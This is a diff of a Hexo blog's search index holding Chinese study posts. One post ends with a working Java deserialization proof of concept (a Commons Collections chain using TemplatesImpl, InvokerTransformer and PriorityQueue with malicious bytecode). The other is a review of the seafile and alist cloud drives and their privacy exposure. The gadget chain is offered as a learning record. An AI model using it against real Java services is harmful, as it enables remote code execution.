+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private void heapify() &#123;</span><br><span class="line">    for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>而这个queue[i]就是我们poc中利用priorityQueue.add方法传入的参数，所以我们只需要传入一个</p>
+<p>templates就可以了</p>
+<p>故最终的poc为：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//让_name!=null</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">namefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">namefield.set(templates,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//让_bytecodes等于恶意字节码</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] codes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\php_project\\shengji_study\\target\\classes\\runtime.class&quot;</span>));</span><br><span class="line">bytecodesfield.set(templates,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;codes&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//为_tfactory赋值</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryfield.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"><span class="comment">//invokerTransformer.transform(templates);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这里把链给断开了</span></span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));<span class="comment">//这里不能用ChainedTransformer,否则会报错</span></span><br><span class="line"></span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line"></span><br><span class="line">priorityQueue.add(templates);</span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//利用反射将链连上</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> TransformingComparator.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">transformerfield</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">transformerfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">transformerfield.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line">Test.Serialize(priorityQueue);</span><br></pre></td></tr></table></figure>
+<p>通过这种方法就可以在不用ChainedTransformer和ConstantTransformer的情况下实现反序列化了</p>
+]]></content>
+      <categories>
+        <category>学习记录</category>
+      </categories>
+      <tags>
+        <tag>java</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>java反序列化之cc2和cc4</title>
     <url>/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc2%E5%92%8Ccc4/</url>
     <content><![CDATA[<h1 id="CC4">CC4</h1>
@@ -320,25 +423,6 @@ URL.hashCode()-&gt;handler.hashCode()-&gt;getHostAddress()</p>
       <tags>
         <tag>java</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/post/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start">Quick Start</h2>
-<h3 id="Create-a-new-post">Create a new post</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server">Run server</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files">Generate static files</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites">Deploy to remote sites</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
   </entry>
   <entry>
     <title>java反序列化之动态代理,cc1和cc6</title>
@@ -398,60 +482,6 @@ URL.hashCode()-&gt;handler.hashCode()-&gt;getHostAddress()</p>
       </categories>
       <tags>
         <tag>java</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>seafile和alist使用体验</title>
-    <url>/post/seafile%E5%92%8Calist%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/</url>
-    <content><![CDATA[<h3 id="背景">背景</h3>
-<p>家里有一台十年前的空闲主机，处理器是赛扬j1900，主板是梅捷SY-1900，平时没怎么使用，正好主板上空着一个sata2接口的硬盘位，就想着废物利用，搭建一个属于自己的<strong>私人网盘</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/b714094e70284d59a3211d8279c39bdb.jpg" alt="b714094e70284d59a3211d8279c39bdb.jpg"  /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<h3 id="seafile">seafile</h3>
-<p>一开始只对seafile有了解，所以没有考虑其他的网盘系统就直接开始搭建seafile了，seafile的部署和使用比较简单，在win7上部署可以参考下面这位大佬的文章（要自己去获取seafile-server_5.0.3_win32.tar.gz的资源）</p>
-<p><a href="https://blog.csdn.net/wwwwestcn/article/details/122424469">https://blog.csdn.net/wwwwestcn/article/details/122424469</a></p>
-<p>seafile在windows上的搭建方法比较简单，整个过程没有遇到什么太难的问题，接下来就我自己的体验来谈谈seafile的优缺点</p>
-<p>优点：</p>
-<p>​    1.支持<strong>多平台客户端</strong>访问、连手机都有专业的app</p>
-<p>​    2.对本地储存的数据进行了<strong>加密</strong>、无法在本地进行查看（这一点因人而异，我认为是优点）</p>
-<p>​    3.访问时必须要输入密码，提高了数据的安全性</p>
-<p>缺点：</p>
-<p>​    1.大于30M的数据只能下载<strong>不能在线预览</strong>，想要线上看视频基本上是不可能的了（这是后来换alist的主要原因）</p>
-<p>​    2.windows版本的<strong>服务端</strong>已经停止更新了，只能自己去找老的版本下载</p>
-<p>​    3.配置有些复杂，访问是用的8000端口、上传是用的8082端口，意味着进行端口转发或者配置反代理服务器的时候需要同时对两个端口进行操作</p>
-<p><img src="https://img-blog.csdnimg.cn/17f9bc567d1d42b9b38de90751182d38.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<h3 id="alist">alist</h3>
-<p>发现seafile的缺点以后，就一直在找其他支持预览大体积文件的私人网盘系统，最终看到了其他博主搭建的alist网盘，发现对预览视频大小没有限制就开始部署alist了</p>
-<p>alist的部署更加简单，具体可以看这位博主的文章</p>
-<p><a href="https://blog.csdn.net/weixin_43957923/article/details/128045524">Alist搭建_「已注销」的博客-CSDN博客_alist搭建教程</a></p>
-<p>同样讲一下alist的优缺点</p>
-<p>优点：</p>
-<p>​    1.搭建简单、配置也不麻烦、页面简易美观</p>
-<p>​    2.支持大体积文件的在线预览、不用下载也能观看</p>
-<p>缺点：</p>
-<p>​    1.没有客户端工具只能通过网页端访问资源</p>
-<p>​    2.默认内容对所有访问用户开放、隐私的内容和相关密码需要自己配置</p>
-<p>​    3.可以通过图片视图大致预览图片列表、希望视频也能有个封面查看</p>
-<p>​    4.有点“重”，内容多的话要加载很久</p>
-<p>这里alist的缺点很多，主要也是因为用alist的体验比较久，但目前来说我对alist的使用是比较满意的，并且alist还支持和百度网盘、阿里网盘、onedrive等知名网盘的联动</p>
-<h3 id="alist的安全问题">alist的安全问题</h3>
-<p>利用黑暗搜索引擎对含有alist的特征网页进行搜索</p>
-<p><img src="https://img-blog.csdnimg.cn/d8e57c2b9ad746fabebceedd38332d81.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>可以看到搜索结果多达一万多条，说明使用alist的用户群还是比较大的，而alist搭建过程中如果管理员没有进行特殊配置的话，所上传的内容是默认对所有访客用户开放的，也就是说你上传的文件没有经过隐私处理就直接暴露在了公网上的话，所有人都可以看到你的文件，如果此时又挂载了百度网盘等其他云储存服务，那么这些网盘中的内容也同样是对外开放的，而这些网盘一般都有同步手机信息、相册、聊天记录等功能，所以极易造成个人隐私泄漏</p>
-<p><img src="https://img-blog.csdnimg.cn/c811906dc6474fadbf5ef3751dee8221.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>（上图是搜索结果中随意点开的一个网页，可以看到网页挂载了很多的网盘，网盘里的内容所有人可见）</p>
-<p>为了防止这种隐私泄漏，我们需要对隐私文件进行<strong>加密或隐藏</strong>，加密方法在alist的说明文档中有</p>
-<p><a href="https://alist.nn.ci/zh/guide/advanced/meta.html">元信息 | AList文档 (nn.ci)</a></p>
-<p>同时也可以参考下面这位up主的视频</p>
-<p><a href="https://b23.tv/IYeqcm6">【Alist】Alist的四大功能使用教程_哔哩哔哩_bilibili</a></p>
-<h3 id="最后">最后</h3>
-<p>搭建私人网盘一定要注意个人信息不被泄露，最好不要直接暴露在公网上，想要访问的话可以通过内网穿透工具实现。</p>
-]]></content>
-      <categories>
-        <category>使用体验</category>
-      </categories>
-      <tags>
-        <tag>alist</tag>
-        <tag>seafile</tag>
       </tags>
   </entry>
   <entry>
@@ -530,6 +560,60 @@ URL.hashCode()-&gt;handler.hashCode()-&gt;getHostAddress()</p>
       </categories>
       <tags>
         <tag>java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>seafile和alist使用体验</title>
+    <url>/post/seafile%E5%92%8Calist%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/</url>
+    <content><![CDATA[<h3 id="背景">背景</h3>
+<p>家里有一台十年前的空闲主机，处理器是赛扬j1900，主板是梅捷SY-1900，平时没怎么使用，正好主板上空着一个sata2接口的硬盘位，就想着废物利用，搭建一个属于自己的<strong>私人网盘</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/b714094e70284d59a3211d8279c39bdb.jpg" alt="b714094e70284d59a3211d8279c39bdb.jpg"  /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h3 id="seafile">seafile</h3>
+<p>一开始只对seafile有了解，所以没有考虑其他的网盘系统就直接开始搭建seafile了，seafile的部署和使用比较简单，在win7上部署可以参考下面这位大佬的文章（要自己去获取seafile-server_5.0.3_win32.tar.gz的资源）</p>
+<p><a href="https://blog.csdn.net/wwwwestcn/article/details/122424469">https://blog.csdn.net/wwwwestcn/article/details/122424469</a></p>
+<p>seafile在windows上的搭建方法比较简单，整个过程没有遇到什么太难的问题，接下来就我自己的体验来谈谈seafile的优缺点</p>
+<p>优点：</p>
+<p>​    1.支持<strong>多平台客户端</strong>访问、连手机都有专业的app</p>
+<p>​    2.对本地储存的数据进行了<strong>加密</strong>、无法在本地进行查看（这一点因人而异，我认为是优点）</p>
+<p>​    3.访问时必须要输入密码，提高了数据的安全性</p>
+<p>缺点：</p>
+<p>​    1.大于30M的数据只能下载<strong>不能在线预览</strong>，想要线上看视频基本上是不可能的了（这是后来换alist的主要原因）</p>
+<p>​    2.windows版本的<strong>服务端</strong>已经停止更新了，只能自己去找老的版本下载</p>
+<p>​    3.配置有些复杂，访问是用的8000端口、上传是用的8082端口，意味着进行端口转发或者配置反代理服务器的时候需要同时对两个端口进行操作</p>
+<p><img src="https://img-blog.csdnimg.cn/17f9bc567d1d42b9b38de90751182d38.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h3 id="alist">alist</h3>
+<p>发现seafile的缺点以后，就一直在找其他支持预览大体积文件的私人网盘系统，最终看到了其他博主搭建的alist网盘，发现对预览视频大小没有限制就开始部署alist了</p>
+<p>alist的部署更加简单，具体可以看这位博主的文章</p>
+<p><a href="https://blog.csdn.net/weixin_43957923/article/details/128045524">Alist搭建_「已注销」的博客-CSDN博客_alist搭建教程</a></p>
+<p>同样讲一下alist的优缺点</p>
+<p>优点：</p>
+<p>​    1.搭建简单、配置也不麻烦、页面简易美观</p>
+<p>​    2.支持大体积文件的在线预览、不用下载也能观看</p>
+<p>缺点：</p>
+<p>​    1.没有客户端工具只能通过网页端访问资源</p>
+<p>​    2.默认内容对所有访问用户开放、隐私的内容和相关密码需要自己配置</p>
+<p>​    3.可以通过图片视图大致预览图片列表、希望视频也能有个封面查看</p>
+<p>​    4.有点“重”，内容多的话要加载很久</p>
+<p>这里alist的缺点很多，主要也是因为用alist的体验比较久，但目前来说我对alist的使用是比较满意的，并且alist还支持和百度网盘、阿里网盘、onedrive等知名网盘的联动</p>
+<h3 id="alist的安全问题">alist的安全问题</h3>
+<p>利用黑暗搜索引擎对含有alist的特征网页进行搜索</p>
+<p><img src="https://img-blog.csdnimg.cn/d8e57c2b9ad746fabebceedd38332d81.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>可以看到搜索结果多达一万多条，说明使用alist的用户群还是比较大的，而alist搭建过程中如果管理员没有进行特殊配置的话，所上传的内容是默认对所有访客用户开放的，也就是说你上传的文件没有经过隐私处理就直接暴露在了公网上的话，所有人都可以看到你的文件，如果此时又挂载了百度网盘等其他云储存服务，那么这些网盘中的内容也同样是对外开放的，而这些网盘一般都有同步手机信息、相册、聊天记录等功能，所以极易造成个人隐私泄漏</p>
+<p><img src="https://img-blog.csdnimg.cn/c811906dc6474fadbf5ef3751dee8221.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>（上图是搜索结果中随意点开的一个网页，可以看到网页挂载了很多的网盘，网盘里的内容所有人可见）</p>
+<p>为了防止这种隐私泄漏，我们需要对隐私文件进行<strong>加密或隐藏</strong>，加密方法在alist的说明文档中有</p>
+<p><a href="https://alist.nn.ci/zh/guide/advanced/meta.html">元信息 | AList文档 (nn.ci)</a></p>
+<p>同时也可以参考下面这位up主的视频</p>
+<p><a href="https://b23.tv/IYeqcm6">【Alist】Alist的四大功能使用教程_哔哩哔哩_bilibili</a></p>
+<h3 id="最后">最后</h3>
+<p>搭建私人网盘一定要注意个人信息不被泄露，最好不要直接暴露在公网上，想要访问的话可以通过内网穿透工具实现。</p>
+]]></content>
+      <categories>
+        <category>使用体验</category>
+      </categories>
+      <tags>
+        <tag>alist</tag>
+        <tag>seafile</tag>
       </tags>
   </entry>
   <entry>
